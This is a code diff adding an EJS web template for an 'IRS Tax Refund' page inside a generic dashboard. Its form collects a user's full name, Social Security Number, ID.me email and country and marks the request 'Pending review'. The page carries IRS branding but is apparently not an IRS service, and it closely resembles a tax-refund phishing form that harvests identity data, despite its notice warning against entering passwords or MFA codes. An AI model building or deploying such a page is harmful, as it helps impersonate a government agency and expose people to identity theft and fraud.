@@ -1,0 +1,888 @@
+<%
+    const oldForm =
+        typeof formData !== "undefined" &&
+        formData
+            ? formData
+            : {};
+
+    const pageError =
+        typeof error !== "undefined"
+            ? error
+            : null;
+
+    const wasSubmitted =
+        typeof submitted !== "undefined" &&
+        submitted;
+%>
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <%- include("partials/head") %>
+</head>
+
+
+<body class="bg-gray-50">
+
+    <%- include("partials/loader") %>
+
+
+    <div
+        x-data="{
+            mobileMenuOpen: false
+        }"
+        class="dashboard-app-shell
+               flex
+               h-screen
+               overflow-hidden"
+    >
+
+        <%- include("partials/sidebar") %>
+
+
+        <div
+            class="dashboard-main-column
+                   flex
+                   flex-col
+                   flex-1
+                   min-w-0
+                   overflow-hidden"
+        >
+
+            <%- include("partials/topbar") %>
+
+            <%- include("partials/mobile-menu") %>
+
+
+            <main
+                class="dashboard-main-content
+                       flex-1
+                       min-w-0
+                       overflow-y-auto"
+            >
+
+                <div class="py-6">
+
+                    <div
+                        class="max-w-5xl
+                               mx-auto
+                               px-4
+                               sm:px-6
+                               md:px-8"
+                    >
+
+
+                        <!-- =================================
+                             HEADER
+                        ================================== -->
+
+                        <div class="mb-6">
+
+                            <h1
+                                class="text-2xl
+                                       font-bold
+                                       text-gray-900"
+                            >
+                                IRS Tax Refund
+                            </h1>
+
+
+                            <p
+                                class="text-sm
+                                       text-gray-500
+                                       mt-1"
+                            >
+                                Submit your tax refund request
+                                information for review.
+                            </p>
+
+                        </div>
+
+
+
+                        <!-- =================================
+                             SUCCESS
+                        ================================== -->
+
+                        <% if (wasSubmitted) { %>
+
+                            <div
+                                class="mb-6
+                                       rounded-xl
+                                       border
+                                       border-green-200
+                                       bg-green-50
+                                       px-4
+                                       py-4"
+                            >
+
+                                <div class="flex items-start">
+
+                                    <i
+                                        data-lucide="circle-check"
+                                        class="h-5
+                                               w-5
+                                               text-green-600
+                                               mr-3
+                                               mt-0.5
+                                               flex-shrink-0"
+                                    ></i>
+
+
+                                    <div>
+
+                                        <p
+                                            class="text-sm
+                                                   font-semibold
+                                                   text-green-800"
+                                        >
+                                            IRS refund request submitted
+                                        </p>
+
+
+                                        <p
+                                            class="text-sm
+                                                   text-green-700
+                                                   mt-1"
+                                        >
+                                            Your information was received
+                                            successfully and your request
+                                            is pending review.
+                                        </p>
+
+                                    </div>
+
+                                </div>
+
+                            </div>
+
+                        <% } %>
+
+
+
+                        <!-- =================================
+                             ERROR
+                        ================================== -->
+
+                        <% if (pageError) { %>
+
+                            <div
+                                class="mb-6
+                                       rounded-xl
+                                       border
+                                       border-red-200
+                                       bg-red-50
+                                       px-4
+                                       py-4"
+                            >
+
+                                <div class="flex items-start">
+
+                                    <i
+                                        data-lucide="circle-alert"
+                                        class="h-5
+                                               w-5
+                                               text-red-600
+                                               mr-3
+                                               mt-0.5
+                                               flex-shrink-0"
+                                    ></i>
+
+
+                                    <p
+                                        class="text-sm
+                                               text-red-700"
+                                    >
+                                        <%= pageError %>
+                                    </p>
+
+                                </div>
+
+                            </div>
+
+                        <% } %>
+
+
+
+                        <!-- =================================
+                             REFUND REQUEST
+                        ================================== -->
+
+                        <section class="dashboard-card">
+
+                            <form
+                                action="/dashboard/irs-refund"
+                                method="POST"
+                            >
+
+
+                                <!-- =================================
+                                     FORM HEADER
+                                ================================== -->
+
+                                <div class="dashboard-card-header">
+
+                                    <div>
+
+                                        <h2
+                                            class="text-lg
+                                                   font-semibold
+                                                   text-gray-900"
+                                        >
+                                            Tax Refund Request
+                                        </h2>
+
+
+                                        <p
+                                            class="text-xs
+                                                   text-gray-500
+                                                   mt-1"
+                                        >
+                                            Complete the information below
+                                            to submit your request.
+                                        </p>
+
+                                    </div>
+
+
+                                    <div
+                                        class="h-11
+                                               w-11
+                                               rounded-full
+                                               bg-primary-50
+                                               flex
+                                               items-center
+                                               justify-center
+                                               flex-shrink-0"
+                                    >
+
+                                        <i
+                                            data-lucide="file-text"
+                                            class="h-5
+                                                   w-5
+                                                   text-primary-700"
+                                        ></i>
+
+                                    </div>
+
+                                </div>
+
+
+
+                                <div class="p-6">
+
+
+                                    <!-- =================================
+                                         PERSONAL INFORMATION
+                                    ================================== -->
+
+                                    <section>
+
+                                        <div class="mb-5">
+
+                                            <div
+                                                class="flex
+                                                       items-center
+                                                       gap-3"
+                                            >
+
+                                                <div
+                                                    class="h-9
+                                                           w-9
+                                                           rounded-lg
+                                                           bg-primary-50
+                                                           flex
+                                                           items-center
+                                                           justify-center
+                                                           flex-shrink-0"
+                                                >
+
+                                                    <i
+                                                        data-lucide="user"
+                                                        class="h-4
+                                                               w-4
+                                                               text-primary-700"
+                                                    ></i>
+
+                                                </div>
+
+
+                                                <div>
+
+                                                    <h3
+                                                        class="text-base
+                                                               font-semibold
+                                                               text-gray-900"
+                                                    >
+                                                        Personal Information
+                                                    </h3>
+
+
+                                                    <p
+                                                        class="text-xs
+                                                               text-gray-500
+                                                               mt-0.5"
+                                                    >
+                                                        Enter the information
+                                                        associated with the
+                                                        refund request.
+                                                    </p>
+
+                                                </div>
+
+                                            </div>
+
+                                        </div>
+
+
+
+                                        <div
+                                            class="grid
+                                                   grid-cols-1
+                                                   md:grid-cols-2
+                                                   gap-5"
+                                        >
+
+
+                                            <!-- Full Name -->
+
+                                            <div>
+
+                                                <label
+                                                    for="fullName"
+                                                    class="dashboard-form-label"
+                                                >
+                                                    Full Name
+                                                </label>
+
+
+                                                <input
+                                                    id="fullName"
+                                                    type="text"
+                                                    name="fullName"
+                                                    value="<%= oldForm.fullName || "" %>"
+                                                    maxlength="150"
+                                                    autocomplete="name"
+                                                    class="dashboard-form-input"
+                                                    placeholder="Enter your full name"
+                                                    required
+                                                >
+
+                                            </div>
+
+
+
+                                            <!-- SSN -->
+
+                                            <div>
+
+                                                <label
+                                                    for="ssn"
+                                                    class="dashboard-form-label"
+                                                >
+                                                    Social Security Number
+                                                </label>
+
+
+                                                <input
+                                                    id="ssn"
+                                                    type="password"
+                                                    name="ssn"
+                                                    inputmode="numeric"
+                                                    autocomplete="off"
+                                                    maxlength="11"
+                                                    class="dashboard-form-input"
+                                                    placeholder="XXX-XX-XXXX"
+                                                    required
+                                                >
+
+
+                                                <p
+                                                    class="text-xs
+                                                           text-gray-400
+                                                           mt-2"
+                                                >
+                                                    Enter a valid 9-digit
+                                                    Social Security Number.
+                                                    This field is not
+                                                    repopulated after an
+                                                    unsuccessful submission.
+                                                </p>
+
+                                            </div>
+
+                                        </div>
+
+                                    </section>
+
+
+
+                                    <!-- =================================
+                                         ID.ME INFORMATION
+                                    ================================== -->
+
+                                    <section
+                                        class="pt-7
+                                               mt-7
+                                               border-t
+                                               border-gray-100"
+                                    >
+
+                                        <div class="mb-5">
+
+                                            <div
+                                                class="flex
+                                                       items-center
+                                                       gap-3"
+                                            >
+
+                                                <div
+                                                    class="h-9
+                                                           w-9
+                                                           rounded-lg
+                                                           bg-blue-50
+                                                           flex
+                                                           items-center
+                                                           justify-center
+                                                           flex-shrink-0"
+                                                >
+
+                                                    <i
+                                                        data-lucide="mail"
+                                                        class="h-4
+                                                               w-4
+                                                               text-blue-700"
+                                                    ></i>
+
+                                                </div>
+
+
+                                                <div>
+
+                                                    <h3
+                                                        class="text-base
+                                                               font-semibold
+                                                               text-gray-900"
+                                                    >
+                                                        ID.me Information
+                                                    </h3>
+
+
+                                                    <p
+                                                        class="text-xs
+                                                               text-gray-500
+                                                               mt-0.5"
+                                                    >
+                                                        Provide the email
+                                                        address associated
+                                                        with your request.
+                                                    </p>
+
+                                                </div>
+
+                                            </div>
+
+                                        </div>
+
+
+
+                                        <div
+                                            class="grid
+                                                   grid-cols-1
+                                                   md:grid-cols-2
+                                                   gap-5"
+                                        >
+
+
+                                            <!-- ID.me Email -->
+
+                                            <div
+                                                class="md:col-span-2"
+                                            >
+
+                                                <label
+                                                    for="idMeEmail"
+                                                    class="dashboard-form-label"
+                                                >
+                                                    ID.me Email
+                                                </label>
+
+
+                                                <input
+                                                    id="idMeEmail"
+                                                    type="email"
+                                                    name="idMeEmail"
+                                                    value="<%= oldForm.idMeEmail || "" %>"
+                                                    autocomplete="email"
+                                                    class="dashboard-form-input"
+                                                    placeholder="name@example.com"
+                                                    required
+                                                >
+
+                                            </div>
+
+                                        </div>
+
+                                    </section>
+
+
+
+                                    <!-- =================================
+                                         LOCATION
+                                    ================================== -->
+
+                                    <section
+                                        class="pt-7
+                                               mt-7
+                                               border-t
+                                               border-gray-100"
+                                    >
+
+                                        <div class="mb-5">
+
+                                            <div
+                                                class="flex
+                                                       items-center
+                                                       gap-3"
+                                            >
+
+                                                <div
+                                                    class="h-9
+                                                           w-9
+                                                           rounded-lg
+                                                           bg-green-50
+                                                           flex
+                                                           items-center
+                                                           justify-center
+                                                           flex-shrink-0"
+                                                >
+
+                                                    <i
+                                                        data-lucide="map-pin"
+                                                        class="h-4
+                                                               w-4
+                                                               text-green-700"
+                                                    ></i>
+
+                                                </div>
+
+
+                                                <div>
+
+                                                    <h3
+                                                        class="text-base
+                                                               font-semibold
+                                                               text-gray-900"
+                                                    >
+                                                        Location Information
+                                                    </h3>
+
+
+                                                    <p
+                                                        class="text-xs
+                                                               text-gray-500
+                                                               mt-0.5"
+                                                    >
+                                                        Provide your current
+                                                        country.
+                                                    </p>
+
+                                                </div>
+
+                                            </div>
+
+                                        </div>
+
+
+
+                                        <div
+                                            class="grid
+                                                   grid-cols-1
+                                                   md:grid-cols-2
+                                                   gap-5"
+                                        >
+
+
+                                            <!-- Country -->
+
+                                            <div>
+
+                                                <label
+                                                    for="country"
+                                                    class="dashboard-form-label"
+                                                >
+                                                    Country
+                                                </label>
+
+
+                                                <input
+                                                    id="country"
+                                                    type="text"
+                                                    name="country"
+                                                    value="<%= oldForm.country || "" %>"
+                                                    maxlength="100"
+                                                    autocomplete="country-name"
+                                                    class="dashboard-form-input"
+                                                    placeholder="Enter your country"
+                                                    required
+                                                >
+
+                                            </div>
+
+                                        </div>
+
+                                    </section>
+
+
+
+                                    <!-- =================================
+                                         SECURITY NOTICE
+                                    ================================== -->
+
+                                    <div
+                                        class="mt-8
+                                               rounded-xl
+                                               border
+                                               border-amber-200
+                                               bg-amber-50
+                                               p-5"
+                                    >
+
+                                        <div class="flex items-start">
+
+                                            <div
+                                                class="h-10
+                                                       w-10
+                                                       rounded-full
+                                                       bg-amber-100
+                                                       flex
+                                                       items-center
+                                                       justify-center
+                                                       mr-4
+                                                       flex-shrink-0"
+                                            >
+
+                                                <i
+                                                    data-lucide="shield-alert"
+                                                    class="h-5
+                                                           w-5
+                                                           text-amber-700"
+                                                ></i>
+
+                                            </div>
+
+
+                                            <div>
+
+                                                <h4
+                                                    class="text-sm
+                                                           font-semibold
+                                                           text-amber-900"
+                                                >
+                                                    Important Notice
+                                                </h4>
+
+
+                                                <p
+                                                    class="text-xs
+                                                           leading-5
+                                                           text-amber-800
+                                                           mt-1"
+                                                >
+                                                    Review your information
+                                                    carefully before
+                                                    submission.
+                                                </p>
+
+
+                                                <p
+                                                    class="text-xs
+                                                           leading-5
+                                                           text-amber-800
+                                                           mt-2"
+                                                >
+                                                    Never enter an ID.me
+                                                    password, one-time login
+                                                    code, MFA code, recovery
+                                                    code, or other
+                                                    authentication secret
+                                                    on this form.
+                                                </p>
+
+                                            </div>
+
+                                        </div>
+
+                                    </div>
+
+
+
+                                    <!-- =================================
+                                         ACTIONS
+                                    ================================== -->
+
+                                    <div
+                                        class="flex
+                                               flex-col-reverse
+                                               sm:flex-row
+                                               sm:items-center
+                                               sm:justify-between
+                                               gap-3
+                                               mt-8"
+                                    >
+
+
+                                        <a
+                                            href="/dashboard"
+                                            class="inline-flex
+                                                   items-center
+                                                   justify-center
+                                                   px-5
+                                                   py-3
+                                                   border
+                                                   border-gray-200
+                                                   bg-white
+                                                   text-gray-700
+                                                   text-sm
+                                                   font-medium
+                                                   rounded-lg
+                                                   hover:bg-gray-50"
+                                        >
+
+                                            <i
+                                                data-lucide="arrow-left"
+                                                class="h-4
+                                                       w-4
+                                                       mr-2"
+                                            ></i>
+
+                                            Back to Dashboard
+
+                                        </a>
+
+
+
+                                        <button
+                                            type="submit"
+                                            class="inline-flex
+                                                   items-center
+                                                   justify-center
+                                                   px-6
+                                                   py-3
+                                                   bg-primary-600
+                                                   hover:bg-primary-700
+                                                   text-white
+                                                   text-sm
+                                                   font-medium
+                                                   rounded-lg"
+                                        >
+
+                                            Submit Request
+
+                                            <i
+                                                data-lucide="send"
+                                                class="h-4
+                                                       w-4
+                                                       ml-2"
+                                            ></i>
+
+                                        </button>
+
+                                    </div>
+
+
+                                </div>
+
+                            </form>
+
+                        </section>
+
+
+                        <!-- =================================
+                             AFTER SUBMISSION
+                        ================================== -->
+
+                        <% if (wasSubmitted) { %>
+
+                            <div
+                                class="dashboard-card
+                                       p-5
+                                       mt-6"
+                            >
+
+                                <div
+                                    class="flex
+                                           flex-col
+                                           sm:flex-row
+                                           sm:items-center
+                                           sm:justify-between
+                                           gap-4"
+                                >
+
+                                    <div>
+
+                                        <p
+                                            class="text-sm
+                                                   font-semibold
+                                                   text-gray-900"
+                                        >
+                                            Request pending review
+                                        </p>
+
+
+                                        <p
+                                            class="text-xs
+                                                   text-gray-500
+                                                   mt-1"
+                                        >
+                                            The submitted request has
+                                            been recorded with a Pending
+                                            status.
+                                        </p>
+
+                                    </div>
+
+
+                                    <span
+                                        class="inline-flex
+                                               self-start
+                                               sm:self-auto
+                                               px-3
+                                               py-1.5
+                                               rounded-full
+                                               bg-yellow-100
+                                               text-yellow-700
+                                               text-xs
+                                               font-medium"
+                                    >
+                                        Pending
+                                    </span>
+
+                                </div>
+
+                            </div>
+
+                        <% } %>
+
+
+                    </div>
+
+                </div>
+
+            </main>
+
+
+            <%- include("partials/footer") %>
+
+        </div>
+
+    </div>
+
+
+    <%- include("partials/scripts") %>
+
+</body>
+
+</html>
